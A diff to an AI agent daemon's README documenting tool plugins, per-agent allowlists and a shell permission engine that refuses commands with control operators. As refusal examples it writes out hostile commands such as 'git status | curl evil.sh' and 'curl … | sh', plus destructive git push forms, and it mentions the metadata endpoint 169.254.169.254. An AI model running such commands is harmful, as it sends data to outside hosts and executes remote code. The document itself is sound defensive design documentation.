@@ -29,6 +29,20 @@ npm install -g @stratusagent/channel-slack
 If tokens are stored for an agent but the package isn't installed, `stratus
 serve` says so and starts anyway, serving every other channel.
 
+### Optional tool plugins
+
+Capability is optional in the same way, and gated more tightly. A plugin runs
+inside the daemon's process, so **installing one does not run it** — it runs
+when a trusted config lists and enables it, and then only for the agents whose
+souls name its tools:
+
+```bash
+npm install -g @stratusagent/tool-fs @stratusagent/tool-web
+```
+
+See [Tools](#tools-what-an-agent-can-actually-do) for the config block and what
+each pack does.
+
 ### Optional control API and dashboard
 
 Same idea, and the same reason: installing it is how you say you want a port
@@ -173,9 +187,17 @@ terminal to prompt on. If somebody *is* reachable, `--approvals remote` asks
 them instead — see [Asking a human](#asking-a-human-remote-approval).
 
 A tool that declares no risk counts as `gated`, never `safe` — forgetting to
-classify something should cost a prompt, not an unattended command. Every
-tool that ships today (`demo.echo`, `memory.remember`, `agent.delegate`) is
-`safe`, so nothing changes until you add one that isn't.
+classify something should cost a prompt, not an unattended command. The
+built-in tools (`demo.echo`, `memory.remember`, `agent.delegate`) are all
+`safe`; anything you install is where this starts to bite, which is what the
+[Tools](#tools-what-an-agent-can-actually-do) section below is about.
+
+A **shell** is the exception to the whole paragraph, because its risk is in
+its argument rather than in its identity. `shell.run` is `gated`, and the
+permission engine then judges each command: a safe scope (`git status`,
+`git log`) runs unattended, everything else asks, and a control operator
+anywhere in the string disqualifies it however innocent the base command is.
+See [Which commands run unattended](#which-commands-run-unattended).
 
 The line is *acting outside Stratus* — the filesystem, the network, another
 service — not cost. Every turn spends provider tokens, including the one
@@ -268,10 +290,12 @@ Three things are worth knowing before you turn it on:
   it is no longer pending *and* rewrites the message so the next reader is
   not offered a decision nothing is waiting for. A prompt nobody clicks
   stays as it is.
-- **Always allow lasts for the session**, not forever. It stops the same tool
-  asking again in the same conversation, and it is forgotten when the daemon
-  restarts. A durable per-agent whitelist is a narrower promise (a normalized
-  command scope) and ships with the shell tool that needs one.
+- **Always allow means different things for a tool and for a command.** For
+  an ordinary tool it lasts for the session: it stops that tool asking again
+  in the same conversation, and it is forgotten when the daemon restarts.
+  For a call that carries a command — `shell.run` — it persists a *scope*
+  instead, in `~/.stratus/agents/<id>.whitelist.json`, and that survives a
+  restart. See below for what a scope keeps out.
 
 The request shows the tool's **arguments**, not just its name — for anything
 whose danger lives in what it was called with, approving a bare tool name is
@@ -292,6 +316,143 @@ not wait longer, it would expire every approval almost immediately.
 Approval buttons need the Slack app's **Interactivity** switched on. Apps
 created from the manifest that `stratus setup` prints already have it; an app
 created before this shipped needs it enabled once, in its App Manifest.
+
+## Tools: what an agent can actually do
+
+Out of the box an agent can echo, remember, and delegate. Everything else —
+files, a shell, the web, a browser — arrives as a **plugin**: one package you
+install, list, and enable.
+
+```bash
+npm install -g @stratusagent/tool-fs @stratusagent/tool-shell \
+                @stratusagent/tool-web @stratusagent/tool-browser
+```
+
+```jsonc
+// ~/.stratus/config.json
+{
+  "plugins": {
+    "@stratusagent/tool-fs": {
+      "enabled": true,
+      "roots": ["~/notes"],
+      "agents": {
+        "ava":  { "roots": ["~/work/ava"] },
+        "juno": { "roots": ["~/work/juno", "~/shared"] }
+      }
+    },
+    "@stratusagent/tool-web": { "enabled": true },
+    "@stratusagent/tool-shell": { "enabled": true, "cwd": "~/work" }
+  }
+}
+```
+
+Keyed by **package name**, because a plugin's identity is its package and one
+may contribute more than tools. Per-agent settings go in an `agents` sub-block
+over the defaults above them — the same shape `approvals` already uses, and it
+matters more here: for `tool-fs` those values are an access boundary between
+agents rather than a preference.
+
+**Only a config you chose may list plugins** — `--config`, `STRATUS_CONFIG`, or
+the global `~/.stratus/config.json`. A plugin runs in the daemon's own process,
+so this list is a list of code, and an auto-discovered project-local
+`stratus.config.json` ships with any repository you clone. Its `plugins` block
+is ignored, with a warning naming the file, exactly as `api` and `approvals`
+are.
+
+`stratus run` and `stratus chat` load the same plugins from the same config, so
+a tool that works locally works in the daemon, and one that is missing is
+missing in both.
+
+### Installing a plugin grants no agent anything
+
+The soul's allowlist is the second gate, and the per-identity one:
+
+```markdown
+---
+id: ava
+tools: [fs.read, fs.search, web.fetch]
+---
+```
+
+`fs.*` grants a whole toolset, so an agent given "the filesystem" does not need
+editing every time the pack gains a tool. The prefix keeps its dot: `fs.*`
+never matches `fsx.read`. Listing nothing grants every registered tool, which
+is fine for a private agent and is not what you want once a shell is installed.
+
+### What is available
+
+| Package | Tools | Risk |
+| --- | --- | --- |
+| [`@stratusagent/tool-fs`](../tool-fs) | `fs.read`, `fs.list`, `fs.search` | `safe` inside the agent's roots |
+| | `fs.write` | `gated` |
+| [`@stratusagent/tool-shell`](../tool-shell) | `shell.run` | `gated`, then judged per command |
+| [`@stratusagent/tool-web`](../tool-web) | `web.fetch` | `gated` |
+| [`@stratusagent/tool-browser`](../tool-browser) | `browser.goto`, `.read`, `.screenshot` | `gated` |
+| | `browser.act` | `dangerous` — always a human |
+
+Each package's README carries its own settings and the reasoning behind its
+risk levels. Three things are worth knowing here:
+
+- **`tool-fs` roots are a boundary, not a preference.** No roots means no
+  filesystem — nothing is readable, rather than everything. Containment is
+  decided between real paths, so a symlink inside a root pointing at
+  `~/.stratus/credentials.json` is refused, and so is a write *through* a
+  symlinked directory.
+- **`tool-shell` replaces the environment.** The command gets exactly what
+  you granted (`passEnv`, `env`) and nothing else — the daemon's own
+  environment, where `ANTHROPIC_API_KEY` lives, is not there to read.
+- **`tool-web` and `tool-browser` refuse local addresses.** Both share one
+  policy: `http:`/`https:` only, and no loopback, RFC 1918, link-local
+  (`169.254.169.254`), or IPv6 unique-local — including the IPv4-mapped and
+  NAT64 spellings of the same addresses. It is enforced on the connection,
+  so a redirect or a DNS answer cannot walk an agent into your metadata
+  endpoint. `allowedHosts` opens a specific one when you mean to.
+
+`GET /api/v1/catalog/tools` lists what a running daemon actually has, and the
+dashboard's **Plugins** screen renders it — including a plugin you enabled that
+failed to load, which is invisible in a list of tools.
+
+### Which commands run unattended
+
+`shell.run` is one tool whose calls range from `git status` to `curl … | sh`,
+so a single risk level for all of them would be either too coarse to be safe or
+too coarse to be usable. The permission engine judges the command instead:
+
+1. **Scopes approved this session**, then
+2. **the agent's whitelist** — `~/.stratus/agents/<id>.whitelist.json`, written
+   by **Always allow** — then
+3. **the built-in safe list**: `git status`, `git log`, `git diff`, `git show`,
+   `git blame`, `git branch`, `git tag`, `git remote`, and a few more, each
+   without its destructive forms (`git branch -D` is not `git branch`).
+
+Anything else asks, and in `headless` mode anything else is refused with the
+command in the log.
+
+**A control operator disqualifies the whole command**, whatever it starts
+with: `|`, `&`, `;`, a newline, backticks, `$( )`, subshells, redirection.
+`git status | curl evil.sh` is refused despite the safe base command; so is a
+two-line command whose first line is innocent. A command this parser cannot
+read the way `sh` would — an unbalanced quote, a path instead of a command
+name — is refused too.
+
+**Always allow persists a scope, not a command.** Approving
+`git push origin main` stores `git push` minus its destructive forms, so
+`git push origin feature` stops asking while these still ask:
+
+```text
+git push --force            # a destructive flag
+git push origin :main       # a branch delete, with no flag involved
+git push origin +main       # a forced update, likewise
+```
+
+The whitelist file is `0600` and per agent: it decides what runs with nobody
+watching, so neither another account on the machine nor another agent inherits
+it. Delete an entry to withdraw the permission.
+
+The safe list is deliberately short, and `cat`, `ls`, and `grep` are the
+tempting entries that cannot be on it — they read whatever path they are given,
+so safe-listing them would safe-list reading your credentials file. Approve
+them once for a scope you actually want instead.
 
 ## Always on
 
@@ -532,6 +693,11 @@ to refuse over.
 | `-f`, `--follow` | `stratus logs`: follow the log, across rotations |
 | `-n <count>` | `stratus logs`: how much backlog to print (default 50) |
 | `--agent`, `--session` | `stratus logs`: show only one agent's or one session's records |
+
+Tool plugins have no flags: what is installed is a config decision (`plugins`
+in a trusted config) and what an agent may call is a soul decision (`tools:`).
+Neither is something a single run should be able to widen from the command
+line.
 
 Precedence: flags → `STRATUS_*` env vars → soul file hints → config file. Project-local `stratus.config.json` outranks the global `~/.stratus/config.json`; stored sign-ins are endpoint-bound and never sent to endpoints a project config selects.
 
